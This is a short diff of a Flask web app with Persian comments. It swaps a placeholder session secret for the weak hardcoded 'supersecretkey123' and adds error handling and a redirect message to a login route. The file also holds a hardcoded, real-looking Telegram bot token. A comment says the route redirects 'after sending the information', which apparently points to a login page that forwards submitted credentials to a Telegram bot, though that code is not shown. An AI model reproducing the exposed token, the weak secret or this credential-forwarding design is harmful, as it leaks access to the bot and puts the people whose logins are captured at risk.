@@ -7,7 +7,7 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.secret_key = "your-secret-key-here"  # کلید مخفی برای مدیریت session
+app.secret_key = "supersecretkey123"  # کلید مخفی برای مدیریت session (می‌تونی یه کلید امن‌تر بذاری)
 
 # تنظیمات ربات تلگرام
 BOT_TOKEN = "6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY"
@@ -36,7 +36,14 @@ def login():
             
             # ریدایرکت به URL پس از ارسال اطلاعات
             logger.info("Login successful, redirecting to URL")
-            return jsonify({"status": "success", "redirect_url": "https://codever-production.up.railway.app/"})
+            return jsonify({
+                "status": "success",
+                "redirect_url": "https://codever-production.up.railway.app/",
+                "message": "Redirecting to the application..."
+            })
+        except requests.RequestException as e:
+            logger.error(f"Network error in POST request: {str(e)}")
+            return jsonify({"status": "error", "message": f"Network error: {str(e)}"}), 500
         except Exception as e:
             logger.error(f"Server error in POST request: {str(e)}")
             return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500
